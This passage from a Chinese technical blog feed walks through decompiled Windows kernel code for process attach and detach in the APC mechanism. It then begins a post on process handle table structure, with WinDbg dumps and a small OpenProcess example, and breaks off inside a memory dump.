class="line">    <span class="built_in">InitializeListHead</span>(&amp;thread-&gt;ApcState.ApcListHead[<span class="number">1</span>]);</span><br><span class="line">    thread-&gt;ApcState.KernelApcInProgress = <span class="number">0</span>;</span><br><span class="line">    thread-&gt;ApcState.KernelApcPending = <span class="number">0</span>;</span><br><span class="line">    thread-&gt;ApcState.UserApcPending = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( a4 == &amp;thread-&gt;SavedApcState )           <span class="comment">// 非挂靠状态</span></span><br><span class="line">    &#123;</span><br><span class="line">        thread-&gt;ApcStatePointer[<span class="number">0</span>] = &amp;thread-&gt;SavedApcState;</span><br><span class="line">        thread-&gt;ApcStatePointer[<span class="number">1</span>] = p_ApcState;</span><br><span class="line">        thread-&gt;ApcStateIndex = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (_InterlockedExchangeAdd(&amp;process-&gt;StackCount.Value, <span class="number">8u</span>) &amp; <span class="number">7</span>) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        p_ApcQueueLock = (<span class="keyword">volatile</span> __int32 *)&amp;thread-&gt;ApcQueueLock;</span><br><span class="line">        _InterlockedAnd((<span class="keyword">volatile</span> <span class="type">signed</span> __int32 *)&amp;thread-&gt;ApcQueueLock, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">KiInSwapSingleProcess</span>();</span><br><span class="line">        processa = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ( _InterlockedExchange(p_ApcQueueLock, <span class="number">1</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> ( (++processa &amp; HvlLongSpinCountMask) != <span class="number">0</span> || (HvlEnlightenments &amp; <span class="number">0x40</span>) == <span class="number">0</span> )</span><br><span class="line">                    _mm_pause();</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="built_in">HvlNotifyLongSpinWait</span>(processa);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> ( *p_ApcQueueLock );</span><br><span class="line">        &#125;</span><br><span class="line">        thread-&gt;ApcState.Process = process;</span><br><span class="line">        _InterlockedAnd(p_ApcQueueLock, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">KiSwapProcess</span>(process, a4-&gt;Process);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        thread-&gt;ApcState.Process = process;</span><br><span class="line">        _InterlockedAnd((<span class="keyword">volatile</span> <span class="type">signed</span> __int32 *)&amp;thread-&gt;ApcQueueLock, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">KiSwapProcess</span>(process, a4-&gt;Process);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">KfLowerIrql</span>(NewIrql);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 <code>KiMoveApcState(a1,a2)</code> 是将 <code>a2</code> 的 <code>APC</code> 队列移动到 <code>a1</code> 中，笔者当时可能想，移动 <code>apc</code> 队列难道不是直接一个指针赋值就完事了嘛，深入分析该函数之后才意识到，里面主要做的操作还有修改双向链表，使得链表第一个成员的 <code>bk</code> 和最后一个成员的 <code>fd</code> 指针指向了新的正确的位置。</p><p>紧接着初始化当前线程的新的 <code>ApcState</code>，当附加之前线程不处于挂靠态，则设置 <code>ApcStateIndex</code> 和 <code>ApcStatePointer</code>，与我们之前分析对应成员的结果一致。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __stdcall <span class="title">KiSwapProcess</span><span class="params">(_KPROCESS *a1, _KPROCESS *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _KPROCESS *v2; <span class="comment">// edx</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> SetMember; <span class="comment">// ecx</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> DirectoryTableBase; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">    _KGDTENTRY *GDT; <span class="comment">// ecx</span></span><br><span class="line"></span><br><span class="line">    v2 = a1;</span><br><span class="line">    SetMember = <span class="built_in">KeGetPcr</span>()-&gt;SetMember;</span><br><span class="line">    _InterlockedXor((<span class="keyword">volatile</span> <span class="type">signed</span> __int32 *)a1-&gt;ActiveProcessors.Bitmap, SetMember);</span><br><span class="line">    _InterlockedXor((<span class="keyword">volatile</span> <span class="type">signed</span> __int32 *)a2-&gt;ActiveProcessors.Bitmap, SetMember);</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)&amp;a2-&gt;LdtDescriptor.LimitLow | *(_DWORD *)&amp;a1-&gt;LdtDescriptor.LimitLow )</span><br><span class="line">    &#123;</span><br><span class="line">        _EAX = *(_DWORD *)&amp;a1-&gt;LdtDescriptor.LimitLow;</span><br><span class="line">        <span class="keyword">if</span> ( _EAX )</span><br><span class="line">        &#123;</span><br><span class="line">            GDT = <span class="built_in">KeGetPcr</span>()-&gt;GDT;</span><br><span class="line">            *(_DWORD *)&amp;GDT[<span class="number">9</span>].LimitLow = _EAX;</span><br><span class="line">            GDT[<span class="number">9</span>].HighWord.Bits = a1-&gt;LdtDescriptor.HighWord.Bits;</span><br><span class="line">            <span class="built_in">KeGetPcr</span>()-&gt;IDT[<span class="number">33</span>] = a1-&gt;Int21Descriptor;</span><br><span class="line">            <span class="built_in">LOWORD</span>(_EAX) = <span class="number">72</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        __asm &#123; lldt    ax &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    DirectoryTableBase = a1-&gt;DirectoryTableBase;</span><br><span class="line">    <span class="keyword">if</span> ( (HvlEnlightenments &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">HvlSwitchVirtualAddressSpace</span>(DirectoryTableBase);</span><br><span class="line">        v2 = a1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        __writecr3(DirectoryTableBase);</span><br><span class="line">    &#125;</span><br><span class="line">    result = v2-&gt;IopmOffset;</span><br><span class="line">    *((_WORD *)<span class="built_in">KeGetPcr</span>()-&gt;NtTib.SubSystemTib + <span class="number">51</span>) = result;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后当然就是将当前 <code>APCState.Process</code> 设置为附加的目标进程，且切换页目录表到目标进程，那么此时的线程就可以读取目标进程相关的虚拟内存了。</p><h2 id="脱离进程分析"><a href="#脱离进程分析" class="headerlink" title="脱离进程分析"></a>脱离进程分析</h2><p>有始有终，也来分析一下脱离进程的函数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __stdcall <span class="title">KeUnstackDetachProcess</span><span class="params">(PRKAPC_STATE ApcState)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _KTHREAD *CurrentThread; <span class="comment">// esi</span></span><br><span class="line">    <span class="keyword">volatile</span> __int32 *p_ApcQueueLock; <span class="comment">// ebx</span></span><br><span class="line">    KAPC_STATE *p_ApcState; <span class="comment">// edi</span></span><br><span class="line">    <span class="type">int</span> v4; <span class="comment">// ecx</span></span><br><span class="line">    _KPROCESS *Process; <span class="comment">// [esp+10h] [ebp-Ch]</span></span><br><span class="line">    <span class="type">int</span> v6; <span class="comment">// [esp+14h] [ebp-8h]</span></span><br><span class="line">    <span class="type">int</span> v7; <span class="comment">// [esp+14h] [ebp-8h]</span></span><br><span class="line">    KIRQL NewIrql; <span class="comment">// [esp+1Bh] [ebp-1h]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( ApcState-&gt;Process != (_KPROCESS *)<span class="number">1</span> )    <span class="comment">// 如果当时附加进程的时候和当前线程所属进程一致，则 ApcState-&gt;Process==1</span></span><br><span class="line">    &#123;</span><br><span class="line">        CurrentThread = <span class="built_in">KeGetCurrentThread</span>();</span><br><span class="line">        Process = CurrentThread-&gt;ApcState.Process;</span><br><span class="line">        v6 = <span class="number">0</span>;</span><br><span class="line">        NewIrql = <span class="built_in">KeRaiseIrqlToDpcLevel</span>();</span><br><span class="line">        p_ApcQueueLock = (<span class="keyword">volatile</span> __int32 *)&amp;CurrentThread-&gt;ApcQueueLock;</span><br><span class="line">        <span class="keyword">while</span> ( _InterlockedExchange(p_ApcQueueLock, <span class="number">1</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> ( (++v6 &amp; HvlLongSpinCountMask) != <span class="number">0</span> || (HvlEnlightenments &amp; <span class="number">0x40</span>) == <span class="number">0</span> )</span><br><span class="line">                    _mm_pause();</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="built_in">HvlNotifyLongSpinWait</span>(v6);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> ( *p_ApcQueueLock );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( CurrentThread-&gt;ApcState.KernelApcPending &amp;&amp; !CurrentThread-&gt;SpecialApcDisable &amp;&amp; !NewIrql )</span><br><span class="line">        &#123;</span><br><span class="line">            _InterlockedAnd(p_ApcQueueLock, <span class="number">0</span>);</span><br><span class="line">            <span class="built_in">KfLowerIrql</span>(<span class="number">0</span>);</span><br><span class="line">            v7 = <span class="number">0</span>;</span><br><span class="line">            NewIrql = <span class="built_in">KeRaiseIrqlToDpcLevel</span>();</span><br><span class="line">            <span class="keyword">while</span> ( _InterlockedExchange(p_ApcQueueLock, <span class="number">1</span>) )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">do</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> ( (++v7 &amp; HvlLongSpinCountMask) != <span class="number">0</span> || (HvlEnlightenments &amp; <span class="number">0x40</span>) == <span class="number">0</span> )</span><br><span class="line">                        _mm_pause();</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                        <span class="built_in">HvlNotifyLongSpinWait</span>(v7);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">while</span> ( *p_ApcQueueLock );</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( !CurrentThread-&gt;ApcStateIndex</span><br><span class="line">            || CurrentThread-&gt;ApcState.KernelApcInProgress</span><br><span class="line">            || (p_ApcState = &amp;CurrentThread-&gt;ApcState, (KAPC_STATE *)p_ApcState-&gt;ApcListHead[<span class="number">0</span>].Flink != p_ApcState)</span><br><span class="line">            || CurrentThread-&gt;ApcState.ApcListHead[<span class="number">1</span>].Flink != &amp;CurrentThread-&gt;ApcState.ApcListHead[<span class="number">1</span>] )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">KeBugCheck</span>(<span class="number">6u</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( ApcState-&gt;Process )                    <span class="comment">// 如果附加进程时，线程不为挂靠状态，则 ApcState-&gt;Process==0</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">KiMoveApcState</span>(&amp;CurrentThread-&gt;ApcState, ApcState-&gt;ApcListHead);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">KiMoveApcState</span>(&amp;CurrentThread-&gt;ApcState, CurrentThread-&gt;SavedApcState.ApcListHead);</span><br><span class="line">            CurrentThread-&gt;SavedApcState.Process = <span class="number">0</span>;</span><br><span class="line">            CurrentThread-&gt;ApcStatePointer[<span class="number">0</span>] = p_ApcState;</span><br><span class="line">            CurrentThread-&gt;ApcStatePointer[<span class="number">1</span>] = &amp;CurrentThread-&gt;SavedApcState;</span><br><span class="line">            CurrentThread-&gt;ApcStateIndex = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        _InterlockedAnd(p_ApcQueueLock, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">KiSwapProcess</span>(CurrentThread-&gt;ApcState.Process, Process);</span><br><span class="line">        <span class="built_in">KfLowerIrql</span>(NewIrql);</span><br><span class="line">        <span class="built_in">KiDecrementProcessStackCount</span>();</span><br><span class="line">        <span class="keyword">if</span> ( (KAPC_STATE *)p_ApcState-&gt;ApcListHead[<span class="number">0</span>].Flink != p_ApcState )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">LOBYTE</span>(v4) = <span class="number">1</span>;</span><br><span class="line">            CurrentThread-&gt;ApcState.KernelApcPending = <span class="number">1</span>;</span><br><span class="line">            <span class="built_in">HalRequestSoftwareInterrupt</span>(v4);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之前分析的时候已经解释过了相关的子函数，配合注释应该能看明白，总之就是三种情况的判断：</p><ul><li><code>ApcState.Process==1</code>，未进行任何附加，因此也不需要脱离</li><li><code>ApcState.Process==0</code>，附加之前线程为非挂靠态，因此脱离时需要回到非挂靠态。</li><li>其余情况，附加之前线程就已经是挂靠态，因此脱离不需要做额外的操作。</li></ul><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：<a href="https://www.cnblogs.com/wingsummer/p/15844264.html">https://www.cnblogs.com/wingsummer/p/15844264.html</a></li></ul>]]></content>
    
    
    <summary type="html">来了解一下Windows的APC机制。</summary>
    
    
    
    <category term="计算机系统" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/"/>
    
    <category term="APC" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/APC/"/>
    
    
  </entry>
  
  <entry>
    <title>windows句柄表学习（1）</title>
    <link href="https://xia0ji233.github.io/2025/01/26/WindowsObjectTable1/"/>
    <id>https://xia0ji233.github.io/2025/01/26/WindowsObjectTable1/</id>
    <published>2025-01-26T08:00:00.000Z</published>
    <updated>2025-02-16T13:24:30.686Z</updated>
    
    <content type="html"><![CDATA[<p>来了解一下Windows内核的句柄表。</p><span id="more"></span><h2 id="句柄"><a href="#句柄" class="headerlink" title="句柄"></a>句柄</h2><p>句柄就类似 <code>Linux</code> 的文件描述符，指示了某个进程在内核对象的偏移，内核可以通过这个下标找到对应的内核对象。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HANDLE g_hMutex = ::<span class="built_in">CreateMutex</span>( <span class="literal">NULL</span> , FALSE, <span class="string">&quot;XYZ&quot;</span>);</span><br><span class="line">HANDLE g_hMutex = ::<span class="built_in">OpenMutex</span>( MUTEX_ALL_ACCESSFALSE, <span class="string">&quot;XYZ&quot;</span>);</span><br><span class="line">HANDLE g_hEvent = ::<span class="built_in">CreateEvent</span>( <span class="literal">NULL</span>, TRUE, FALSE, <span class="literal">NULL</span>);</span><br><span class="line">HANDLE g_hThread = ::<span class="built_in">CreateThread</span>( <span class="literal">NULL</span>, <span class="number">0</span>, Proc,<span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p><strong>句柄是给3环用的，而不是给内核用的</strong> 。所以在写驱动的时候，不要搞句柄花里胡哨的东西。<code>Windows</code>所有涉及句柄的<code>API</code>，一旦到了真正函数实现的部分，就立刻使用<code>ObReferenceObjectByHandle</code>把它转化为真正的指向内核对象的指针。</p><h2 id="句柄表"><a href="#句柄表" class="headerlink" title="句柄表"></a>句柄表</h2><p>之前看进程结构体里面，其实就有一个成员叫句柄表 <code>ObjectTable</code>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _EPROCESS</span><br><span class="line">ntdll!_EPROCESS</span><br><span class="line">   <span class="number">+0x000</span> Pcb              : _KPROCESS</span><br><span class="line">   <span class="number">+0x0f0</span> ExceptionPortState : Pos <span class="number">0</span>, <span class="number">3</span> Bits</span><br><span class="line">   <span class="number">+0x0f4</span> ObjectTable      : Ptr32 _HANDLE_TABLE</span><br><span class="line">   <span class="number">+0x0f8</span> Token            : _EX_FAST_REF</span><br></pre></td></tr></table></figure><h3 id="句柄表结构"><a href="#句柄表结构" class="headerlink" title="句柄表结构"></a>句柄表结构</h3><p>句柄表也是有一个专门的结构维护的，来看看：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _HANDLE_TABLE</span><br><span class="line">ntdll!_HANDLE_TABLE</span><br><span class="line">   <span class="number">+0x000</span> TableCode        : Uint4B</span><br><span class="line">   <span class="number">+0x004</span> QuotaProcess     : Ptr32 _EPROCESS</span><br><span class="line">   <span class="number">+0x008</span> UniqueProcessId  : Ptr32 Void</span><br><span class="line">   <span class="number">+0x00c</span> HandleLock       : _EX_PUSH_LOCK</span><br><span class="line">   <span class="number">+0x010</span> HandleTableList  : _LIST_ENTRY</span><br><span class="line">   <span class="number">+0x018</span> HandleContentionEvent : _EX_PUSH_LOCK</span><br><span class="line">   <span class="number">+0x01c</span> DebugInfo        : Ptr32 _HANDLE_TRACE_DEBUG_INFO</span><br><span class="line">   <span class="number">+0x020</span> ExtraInfoPages   : Int4B</span><br><span class="line">   <span class="number">+0x024</span> Flags            : Uint4B</span><br><span class="line">   <span class="number">+0x024</span> StrictFIFO       : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x028</span> FirstFreeHandle  : Uint4B</span><br><span class="line">   <span class="number">+0x02c</span> LastFreeHandleEntry : Ptr32 _HANDLE_TABLE_ENTRY</span><br><span class="line">   <span class="number">+0x030</span> HandleCount      : Uint4B</span><br><span class="line">   <span class="number">+0x034</span> NextHandleNeedingPool : Uint4B</span><br><span class="line">   <span class="number">+0x038</span> HandleCountHighWatermark : Uint4B</span><br></pre></td></tr></table></figure><p>最低两位表示句柄表的级数，例如最低两位位为 <code>0</code> 表示该句柄表存放的是真正的句柄，如果为 01 或者 10 则表示指向了一个句柄表，如下图所示：</p><img src="/2025/01/26/WindowsObjectTable1/1.png" class=""><p>顺表介绍一下句柄在句柄表中的结构，一个句柄项占 <code>8</code> 字节，通常来说一个句柄表会占一个页（4KB），所以一个句柄表最多容纳 512 个句柄项。</p><img src="/2025/01/26/WindowsObjectTable1/2.png" class=""><p>①：这一块共计两个字节，高位字节是给<code>SetHandleInformation</code>这个函数用的，比如写成如下形式，那么这个位置将被写入<code>0x02</code>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SetHandleInformation</span>(Handle,HANDLE_FLAG_PROTECT_FROM_CLOSE,HANDLE_FLAG_PROTECT_FROM_CLOSE);</span><br></pre></td></tr></table></figure><p><code>HANDLE_FLAG_PROTECT_FROM_CLOSE</code>宏的值为<code>0x00000002</code>，取最低字节，最终 ① 这块是<code>0x0200</code>。</p><p>②：这块是访问掩码，是给<code>OpenProcess</code>这个函数用的，具体的存的值就是这个函数的第一个参数的值。</p><p>③ 和 ④ 这两个块共计四个字节，其中<code>bit0-bit2</code>存的是这个句柄的属性，其中<code>bit2</code>和<code>bit0</code>默认为<code>0</code>和<code>1</code>; <code>bit1</code>表示的函数是该句柄是否可继承，<code>OpenProcess</code>的第二个参数与<code>bit1</code>有关，bit31-bit3则是存放的该内核对象在内核中的具体的地址。</p><p>挂在进程下的句柄表就叫<strong>私有句柄表</strong>，除此之外内核还维护一张<strong>全局句柄表</strong>。</p><h3 id="私有句柄表"><a href="#私有句柄表" class="headerlink" title="私有句柄表"></a>私有句柄表</h3><p>私有句柄表有很多类型的句柄，文件句柄、进程句柄、线程句柄、快照句柄等等。</p><p>这里以 <code>OpenProcess</code> 打开的句柄为例。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD pid=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;pid);</span><br><span class="line">HANDLE hProcess=<span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS,FALSE,pid);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;HANDLE=%p&quot;</span>,hProcess);</span><br><span class="line"><span class="built_in">getchar</span>();</span><br><span class="line"><span class="built_in">getchar</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为发现 win7 的镜像自带的任务管理器居然没有显示 pid，所以使用 CE 查看。</p><img src="/2025/01/26/WindowsObjectTable1/3.png" class=""><p>这里获取了 <code>explorer.exe</code> 的句柄，返回值为 <code>0x2C</code>。</p><p>这里需要注意的是，句柄表项指向的仍然不是真正的内核对象，而是一个 <code>_OBJECT_HEADER</code> 结构，在里面可以区分该句柄是进程句柄，线程句柄还是其它句柄。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kd&gt;!process <span class="number">0</span> <span class="number">0</span></span><br><span class="line">PROCESS <span class="number">887</span>fc888  SessionId: <span class="number">1</span>  Cid: <span class="number">0634</span>    Peb: <span class="number">7</span>ffdc000  ParentCid: <span class="number">0614</span></span><br><span class="line">    DirBase: <span class="number">401</span>d3000  ObjectTable: <span class="number">92303268</span>  HandleCount: <span class="number">567.</span></span><br><span class="line">    Image: explorer.exe</span><br><span class="line">PROCESS <span class="number">87</span>d73450  SessionId: <span class="number">1</span>  Cid: <span class="number">0</span>d30    Peb: <span class="number">7</span>ffd9000  ParentCid: <span class="number">070</span>c</span><br><span class="line">    DirBase: <span class="number">7480</span>b000  ObjectTable: <span class="number">923</span>c7920  HandleCount:  <span class="number">17.</span></span><br><span class="line">    Image: Test<span class="number">1.</span>exe</span><br></pre></td></tr></table></figure><p>可以快速得到该进程的句柄表位置，然后找到该句柄表。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _HANDLE_TABLE <span class="number">923</span>c7920</span><br><span class="line">nt!_HANDLE_TABLE</span><br><span class="line">   <span class="number">+0x000</span> TableCode        : <span class="number">0xa4cfc001</span></span><br><span class="line">   <span class="number">+0x004</span> QuotaProcess     : <span class="number">0x87d73450</span> _EPROCESS</span><br><span class="line">   <span class="number">+0x008</span> UniqueProcessId  : <span class="number">0x00000d30</span> Void</span><br><span class="line">   <span class="number">+0x00c</span> HandleLock       : _EX_PUSH_LOCK</span><br><span class="line">   <span class="number">+0x010</span> HandleTableList  : _LIST_ENTRY [ <span class="number">0xa4c25708</span> - <span class="number">0xab485c68</span> ]</span><br><span class="line">   <span class="number">+0x018</span> HandleContentionEvent : _EX_PUSH_LOCK</span><br><span class="line">   <span class="number">+0x01c</span> DebugInfo        : (null) </span><br><span class="line">   <span class="number">+0x020</span> ExtraInfoPages   : <span class="number">0</span>n0</span><br><span class="line">   <span class="number">+0x024</span> Flags            : <span class="number">0</span></span><br><span class="line">   <span class="number">+0x024</span> StrictFIFO       : <span class="number">0</span>y0</span><br><span class="line">   <span class="number">+0x028</span> FirstFreeHandle  : <span class="number">0x30</span></span><br><span class="line">   <span class="number">+0x02c</span> LastFreeHandleEntry : <span class="number">0xa4cb3ff8</span> _HANDLE_TABLE_ENTRY</span><br><span class="line">   <span class="number">+0x030</span> HandleCount      : <span class="number">0x11</span></span><br><span class="line">   <span class="number">+0x034</span> NextHandleNeedingPool : <span class="number">0x1800</span></span><br><span class="line">   <span class="number">+0x038</span> HandleCountHighWatermark : <span class="number">0x11</span></span><br></pre></td></tr></table></figure><p>TableCode 的最低两位为 1，说明是二级的句柄表，需要索引一次，也就是将句柄下标 &#x2F;512 得到二级句柄表所在的下标，取512模得到二级句柄表内的偏移。</p><p>0x2C 的实际下标是 <code>0x2C/4=11</code>， 那么 <code>11/512=0</code>，<code>11%512=11</code>，即可知道应该找第一个二级句柄表，表内偏移为 <code>11*8</code> （每个句柄项大小为 8）。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dd <span class="number">0xa4cfc000</span></span><br><span class="line">a4cfc000  ab7c1000 a4d01000 a4cb3000 <span class="number">00000000</span></span><br><span class="line">a4cfc010  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">a4cfc020  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span 